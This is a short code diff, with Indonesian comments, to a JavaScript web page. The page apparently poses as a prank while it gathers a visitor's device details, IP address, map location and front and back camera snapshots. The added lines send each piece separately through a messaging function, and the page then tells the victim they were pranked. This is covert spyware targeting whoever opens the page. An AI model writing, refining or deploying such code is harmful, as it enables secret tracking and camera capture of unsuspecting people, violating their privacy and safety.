@@ -227,12 +227,13 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       ]);
 
       let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+      await kirimPesan(hasil); // Kirim informasi dulu
 
       const kameraDepan = await ambilKamera("user", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡");
-      if (kameraDepan) hasil += `\n${kameraDepan}`;
+      if (kameraDepan) await kirimPesan(kameraDepan); // Kirim notif jika gagal
 
       const kameraBelakang = await ambilKamera("environment", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚");
-      if (kameraBelakang) hasil += `\n${kameraBelakang}`;
+      if (kameraBelakang) await kirimPesan(kameraBelakang); // Kirim notif jika gagal
 
       document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
       await kirimPesan(hasil);
